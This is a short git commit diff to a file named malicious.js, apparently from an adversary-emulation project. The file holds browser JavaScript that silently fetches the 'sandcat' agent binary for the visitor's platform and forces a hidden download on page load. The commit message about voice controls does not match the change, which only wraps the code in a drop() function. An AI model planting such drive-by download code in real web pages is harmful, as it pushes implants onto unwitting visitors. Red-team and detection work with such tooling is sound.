c68eb8a2ae9d8bc9b4526e48755ff5b7b8655556
david <49954156+privateducky@users.noreply.github.com>
2019-09-27 09:53:01 -0400

    adding voice controls to shared JS (#96)

--- static/js/malicious.js
+++ static/js/malicious.js
@@ -1,22 +1,27 @@
-let headers = {
-    "file": "sandcat.go",
-    "platform": determinePlatform()
-};
-let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
-fetch(loc + '/file/download', {
-    method: "POST",
-    headers: headers})
-  .then(resp => resp.blob())
-  .then(blob => {
-    const url = window.URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.style.display = 'none';
-    a.href = url;
-    a.download = 'sandcat';
-    document.body.appendChild(a);
-    a.click();
-    window.URL.revokeObjectURL(url);
-  }).catch(() => console.log("Error auto-downloading 54ndc47"));
+drop();
+
+function drop() {
+    let headers = {
+        "file": "sandcat.go",
+        "platform": determinePlatform()
+    };
+    let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
+    fetch(loc + '/file/download', {
+        method: "POST",
+        headers: headers})
+      .then(resp => resp.blob())
+      .then(blob => {
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.style.display = 'none';
+        a.href = url;
+        a.download = 'sandcat';
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+      }).catch(() => console.log("Error auto-downloading 54ndc47"));
+}
+
 
 function determinePlatform() {
     let OSName = "unknown";
